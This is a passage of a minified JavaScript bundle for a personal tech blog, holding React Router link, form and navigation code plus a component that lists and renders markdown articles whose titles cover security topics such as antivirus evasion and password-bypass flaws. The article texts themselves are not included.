ne=!(b.isExternal||i),re=v.createElement(`a`,{...p,...T,href:(ne?S:void 0)||b.absoluteURL||x,onClick:ne?E:e,ref:jf(m,w),target:c,"data-discover":!y&&t===`render`?`true`:void 0});return C&&!y?v.createElement(v.Fragment,null,re,v.createElement(Df,{page:x})):re});Pf.displayName=`Link`;var Ff=v.forwardRef(function({"aria-current":e=`page`,caseSensitive:t=!1,className:n=``,end:r=!1,style:i,to:a,viewTransition:o,children:s,...c},l){let u=Ed(a,{relative:c.relative}),d=xd(),f=v.useContext(ad),{navigator:p,basename:m}=v.useContext(dd),h=f!=null&&Wf(u)&&o===!0,g=p.encodeLocation?p.encodeLocation(u).pathname:u.pathname,_=d.pathname,y=f&&f.navigation&&f.navigation.location?f.navigation.location.pathname:null;t||(_=_.toLowerCase(),y=y?y.toLowerCase():null,g=g.toLowerCase()),y&&m&&(y=Mu(y,m)||y);let b=g!==`/`&&g.endsWith(`/`)?g.length-1:g.length,x=_===g||!r&&_.startsWith(g)&&_.charAt(b)===`/`,ee=y!=null&&(y===g||!r&&y.startsWith(g)&&y.charAt(g.length)===`/`),S={isActive:x,isPending:ee,isTransitioning:h},C=x?e:void 0,w;w=typeof n==`function`?n(S):[n,x?`active`:null,ee?`pending`:null,h?`transitioning`:null].filter(Boolean).join(` `);let T=typeof i==`function`?i(S):i;return v.createElement(Pf,{...c,"aria-current":C,className:w,ref:l,style:T,to:a,viewTransition:o},typeof s==`function`?s(S):s)});Ff.displayName=`NavLink`;var If=v.forwardRef(({discover:e=`render`,fetcherKey:t,navigate:n,reloadDocument:r,replace:i,state:a,method:o=Xd,action:s,onSubmit:c,relative:l,preventScrollReset:u,viewTransition:d,defaultShouldRevalidate:f,...p},m)=>{let{useTransitions:h}=v.useContext(dd),g=Hf(),_=Uf(s,{relative:l}),y=o.toLowerCase()===`get`?`get`:`post`,b=typeof s==`string`&&$l.test(s);return v.createElement(`form`,{ref:m,method:y,action:_,onSubmit:r?c:e=>{if(c&&c(e),e.defaultPrevented)return;e.preventDefault();let r=e.nativeEvent.submitter,s=r?.getAttribute(`formmethod`)||o,p=()=>g(r||e.currentTarget,{fetcherKey:t,method:s,navigate:n,replace:i,state:a,relative:l,preventScrollReset:u,viewTransition:d,defaultShouldRevalidate:f});h&&n!==!1?v.startTransition(()=>p()):p()},...p,"data-discover":!b&&e===`render`?`true`:void 0})});If.displayName=`Form`;function Lf(e){return`${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function Rf(e){let t=v.useContext(id);return Y(t,Lf(e)),t}function zf(e,{target:t,replace:n,mask:r,state:i,preventScrollReset:a,relative:o,viewTransition:s,defaultShouldRevalidate:c,useTransitions:l}={}){let u=wd(),d=xd(),f=Ed(e,{relative:o});return v.useCallback(p=>{if(rf(p,t)){p.preventDefault();let t=n===void 0?cu(d)===cu(f):n,m=()=>u(e,{replace:t,mask:r,state:i,preventScrollReset:a,relative:o,viewTransition:s,defaultShouldRevalidate:c});l?v.startTransition(()=>m()):m()}},[d,u,f,n,r,i,t,e,a,o,s,c,l])}var Bf=0,Vf=()=>`__${String(++Bf)}__`;function Hf(){let{router:e}=Rf(`useSubmit`),{basename:t}=v.useContext(dd),n=Bd(),r=e.fetch,i=e.navigate;return v.useCallback(async(e,a={})=>{let{action:o,method:s,encType:c,formData:l,body:u}=lf(e,t);if(a.navigate===!1){let e=a.fetcherKey||Vf();await r(e,n,a.action||o,{defaultShouldRevalidate:a.defaultShouldRevalidate,preventScrollReset:a.preventScrollReset,formData:l,body:u,formMethod:a.method||s,formEncType:a.encType||c,flushSync:a.flushSync})}else await i(a.action||o,{defaultShouldRevalidate:a.defaultShouldRevalidate,preventScrollReset:a.preventScrollReset,formData:l,body:u,formMethod:a.method||s,formEncType:a.encType||c,replace:a.replace,state:a.state,fromRouteId:n,flushSync:a.flushSync,viewTransition:a.viewTransition})},[r,i,t,n])}function Uf(e,{relative:t}={}){let{basename:n}=v.useContext(dd),r=v.useContext(pd);Y(r,`useFormAction must be used inside a RouteContext`);let[i]=r.matches.slice(-1),a={...Ed(e||`.`,{relative:t})},o=xd();if(e==null){a.search=o.search;let e=new URLSearchParams(a.search),t=e.getAll(`index`);if(t.some(e=>e===``)){e.delete(`index`),t.filter(e=>e).forEach(t=>e.append(`index`,t));let n=e.toString();a.search=n?`?${n}`:``}}return(!e||e===`.`)&&i.route.index&&(a.search=a.search?a.search.replace(/^\?/,`?index&`):`?index`),n!==`/`&&(a.pathname=a.pathname===`/`?n:Bu([n,a.pathname])),cu(a)}function Wf(e,{relative:t}={}){let n=v.useContext(cd);Y(n!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:r}=Rf(`useViewTransitionState`),i=Ed(e,{relative:t});if(!n.isTransitioning)return!1;let a=Mu(n.currentLocation.pathname,r)||n.currentLocation.pathname,o=Mu(n.nextLocation.pathname,r)||n.nextLocation.pathname;return Ou(i.pathname,o)!=null||Ou(i.pathname,a)!=null}var Gf=Object.entries(Object.assign({"./md/2022-06-06_exploiting_wiz_smart_lights.md":w,"./md/2022-06-07_bringing_back_sensitive_files_from_web_archives.md":T,"./md/2022-06-09_creating_a_dockerfile.md":te,"./md/2022-06-10_automating_web_pentesting_with_jaeles.md":E,"./md/2022-06-11_keeping_notes_during_an_assessment.md":ne,"./md/2022-06-13_intro_to_command_line_arguments.md":re,"./md/2022-06-22_modifying_packets_on_the_fly__python_.md":ie,"./md/2022-08-12_bypassing_all_known_anti_virus_applications__python_meterpreter_.md":ae,"./md/2022-10-11_get_real_ip_behind_a_reverse_proxy.md":oe,"./md/2022-11-18_android_pen_testing_with_frida.md":se,"./md/2022-11-18_debugging_android_apps_with_andbug.md":ce,"./md/2022-12-11_finding_urls__cyber_sec_.md":D,"./md/2022-12-12_using_linux_effectively__for_cyber_sec_.md":O,"./md/2023-02-16_llmnr_and_llmnr_poisoning_in_depth.md":le,"./md/2023-03-25_setting_up_and_using_elasticsearch.md":ue,"./md/2023-04-07_password_manager__sandeep_rathore___1_8_14__newest_version__authentication_bypass.md":de,"./md/2023-04-09_hidepass_password_manager__1_9_1__newest_version__password_bypass_vulnerability.md":fe,"./md/2023-04-10_folder_lock_mobile___2_8_1__newest_version__password_bypass.md":pe,"./md/2023-04-10_secure_notes_lock___1_6_6__newest_version__multiple_critical_vulnerabilities.md":k,"./md/2023-04-11_photo_video_gallery_locker____1_3_2__newest_version__password_bypass.md":me,"./md/2023-04-11_vault__newsoftwares_llc___1_4_9__newest_version__password_bypass.md":he,"./md/2023-08-04_dll_creation_and_injection_with_golang.md":ge,"./md/2023-10-08_searching_through_huge_amounts_of_unstructured_data_fast_inverted_index_.md":_e,"./md/2024-01-27_hacking_wifi_devices_and_networks.md":ve,"./md/2024-01-31_tcp_connection_hijacking_deep_dive.md":ye,"./md/2024-02-20_server_side_prototype_pollution.md":be,"./md/2024-02-24_explaining_and_exploiting_open_redirect_vulnerabilities.md":xe,"./md/2024-02-25_crlf_injection.md":Se})).map(([e,t])=>({slug:e?.split(`/`)?.pop()?.replace(`.md`,``),content:t})).map(e=>({slug:e.slug,content:e.content.replaceAll(`https://miro.medium.com/v2/resize:fit:1400/format:webp/0*`,`/media/`).replaceAll(`https://miro.medium.com/v2/resize:fit:1400/format:webp/1*`,`/media/`).replaceAll(`https://miro.medium.com/v2/resize:fit:1400/format:webp/2*`,`/media/`)}));function Kf(){let{hash:e}=xd(),t=e.slice(1),[n,r]=(0,v.useState)({}),[i,a]=(0,v.useState)(!1);(0,v.useEffect)(()=>{let e={};Gf.map(n=>e[n.slug]=t==n.slug),r(e),document.getElementById(t)?.scrollIntoView({behavior:`smooth`})},[]),console.log(n);let o=Gf.sort((e,t)=>{let n=e.slug.slice(0,10);return t.slug.slice(0,10).localeCompare(n)});function s(e){let t={};Gf.map(r=>t[r.slug]=e==r.slug&&!n[e]),r(t),a(!i)}return(0,x.jsxs)(`main`,{children:[(0,x.jsx)(ee,{version:2}),(0,x.jsxs)(`div`,{className:`p-3 flex flex-col items-center`,children:[(0,x.jsxs)(`div`,{className:`my-[5vh]`,children:[(0,x.jsx)(`h1`,{className:`text-[calc(15px_+_1.5vw)]`,children:`Welcome to my personal blog where I post about various tech related topics!`}),(0,x.jsxs)(`span`,{children:[`AI has `,(0,x.jsx)(`span`,{className:`text-red-600 text-sm`,children:`NOT`}),` been used in the writing of these articles.`]})]}),o.map(e=>(0,x.jsxs)(`section`,{id:e.slug,className:`article my-[1vh] ms-auto me-auto max-w-[1500px] flex flex-col w-full`,children:[(0,x.jsxs)(`span`,{className:`text-3xl`,children:[`- `,e.slug.slice(0,10)]}),n[e.slug]?(0,x.jsxs)(x.Fragment,{children:[(0,x.jsx)(`button`,{onClick:()=>s(e.slug),className:`bg-[rgb(80,0,255)] font-bold p-2 text-3xl w-full hover:cursor-pointer`,children:`Close Article`}),(0,x.jsxs)(`div`,{className:`p-5 bg-white/2 break-all`,children:[(0,x.jsxs)(`div`,{className:`flex gap-2 my-5`,children:[(0,x.jsx)(`a`,{href:`/blog#${e.slug}`,className:`text-underline text-xl`,children:`Reference link`}),`|`,(0,x.jsxs)(`span`,{className:`text-xl`,children:[`Published: `,e.slug.slice(0,10)]})]}),(0,x.jsx)(Wl,{remarkPlugins:[Ka],children:e.content})]})]}):(0,x.jsx)(`button`,{onClick:()=>s(e.slug),className:`bg-[rgb(80,0,255)] font-bold p-2 text-[calc(20px_+_0.5vw)] hover:cursor-pointer`,children:e.slug.slice(10,1e3).replaceAll(`_`,` `).trim().toUpperCase()})]}))]})]})}function qf(){return(0,x.jsx)(Nf,{children:(0,x.jsxs)(Jd,{children:[(0,x.jsx)(Kd,{path:`/`,element:(0,x.jsx)(C,{})}),(0,x.jsx)(Kd,{path:`/blog`,element:(0,x.jsx)(Kf,{})})]})})}(0,y.createRoot)(document.getElementById(`root`)).render((0,x.jsx)(v.StrictMode,{children:(0,x.jsx)(qf,{})}));